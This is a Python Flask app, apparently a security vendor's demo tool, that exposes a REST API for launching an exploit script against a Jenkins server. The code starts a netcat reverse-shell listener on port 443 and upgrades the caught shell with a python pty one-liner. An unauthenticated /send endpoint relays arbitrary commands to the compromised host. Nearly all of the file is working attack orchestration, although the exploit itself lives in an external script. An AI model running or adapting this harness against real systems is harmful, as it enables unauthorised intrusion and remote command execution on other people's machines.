# Copyright (c) 2018, Palo Alto Networks
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

"""
Palo Alto Networks - demo-launcher

Super simple App to expose a RESTful API to launch a couple of scripts

This software is provided without support, warranty, or guarantee.
Use at your own risk.
"""

import logging
import os
import time

import pexpect
from flask import Flask
from flask import request

app = Flask(__name__)

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

# create file handler which logs even debug messages
fh = logging.FileHandler('exp-server.log')
fh.setLevel(logging.DEBUG)

# create console handler with a higher log level
ch = logging.StreamHandler()
ch.setLevel(logging.INFO)

logger.addHandler(fh)
logger.addHandler(ch)


@app.route("/")
def hello():
    return "Happy Hacking!", 200


@app.route("/launch", methods=['POST'])
def launch_sploit():
    """
    Accepts a JSON payload with the following structure:
    {
        "target": "nlb-something.fqdn.com",
        "attacker": "1.2.3.4"
    }

    If the payload parses correctly, then launch a reverse shell listener using pexpect.spawn
    then spawn the auto-sploit.sh tool and enter the target and attacker info again using pexpect

    :return: Simple String response for now

    """
    if request.is_json:
        logger.debug(request.data)
        payload = request.get_json()
        logger.debug(request.mimetype)
        logger.debug(request.content_type)
        logger.debug(request.accept_mimetypes)
        logger.debug(payload)
        logger.debug(type(payload))
        target_ip = payload.get('target', '')
        attacker_ip = payload.get('attacker', '')
        if target_ip == "" or attacker_ip == "":
            logger.error('Payload is all wrong!')
            logger.error(payload)
            return 'ERROR - Invalid Payload', 400

        exe = '/root/auto-sploit.sh'
        if not os.path.exists(exe):
            return 'launch script does not exist', 500

        logger.info('Launching auto-sploit.sh')
        child = pexpect.spawn('/root/auto-sploit.sh')
        child.delaybeforesend = 2
        found_index = child.expect(['press any key to continue', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info('launching listener process')
            _launch_listener()
            child.send('\n')
        else:
            return 'ERROR - Could not launch exploit tool', 500

        found_index = child.expect(['Enter Attacker IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info('Sending attacker ip :::' + attacker_ip + ':::')
            child.sendline(attacker_ip)
        else:
            return 'ERROR - Could not enter attacker IP', 500

        found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.debug(child.before)
            logger.info('Sending target ip')
            child.sendline(target_ip)
        else:
            logger.error(child.before)
            return 'ERROR - Could not enter jenkins IP', 500

        found_index = child.expect(['pwn', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info('PWN')
            logger.debug(child)
            time.sleep(2)
            return 'SUCCESS - auto-sploit launched!', 200

    else:
        return 'No Bueno - No JSON payload detected', 400


@app.route("/send", methods=['POST'])
def send_cmd():
    if request.is_json:
        data = request.get_json()
        cli = data.get('cli', '')
        if cli == '':
            return 'No Bueno - Invalid JSON payload', 400

        if 'listener' in app.config:
            logger.info('We have a listener already up!')
            listener = app.config.get('listener', '')
            if not hasattr(listener, 'isalive') or not listener.isalive():
                return 'No Bueno - Listener does not appear to be active', 400

            logger.info('Sending initial command to see where we are!')
            listener.sendline('echo $SHLVL\n')
            found_index = listener.expect(['1', 'jenkins@', 'root@', pexpect.EOF, pexpect.TIMEOUT])
            logger.debug(found_index)
            if found_index == 0:
                # no prompt yet
                logger.info('Great, trying to get a prompt now')
                listener.sendline("python -c 'import pty; pty.spawn(\"/bin/bash\")'")

            if found_index > 2:
                logger.error(listener.before)
                return 'Something is wrong with the listener connection!', 500

            # listener.sendline(cli)
            # logger.debug(listener)
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            logger.debug('Found index is now: ' + str(found_index))
            if found_index > 1:
                logger.error(listener)
                return 'Something is wrong with the listener connection!', 500
            listener.sendline(cli)
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            logger.debug('Found index after cli is now: ' + str(found_index))
            if found_index > 1:
                logger.error(listener)
                return 'Something is wrong with the listener connection!', 500
            logger.debug(listener)
            return listener.before

        else:
            return 'Exploit is not currently active, ensure you have launched the exploit first!', 400
    else:
        return 'Invalid Payload for send command', 400


def _launch_listener():
    if 'listener' not in app.config:
        listener = pexpect.spawn('nc -lvp 443')
        found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
        if found_index != 0:
            return False
        app.config['listener'] = listener
        logger.info('Launched and ready to rock')
        return True
    else:
        listener = app.config['listener']
        if hasattr(listener, 'isalive') and listener.isalive():
            if listener.terminate(force=True):
                logger.debug('Removed old listener')
            else:
                logger.error('Could not remove old listener!')
                return False

        listener = pexpect.spawn('nc -lvp 443')
        found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
        if found_index != 0:
            return False
        app.config['listener'] = listener
        return True
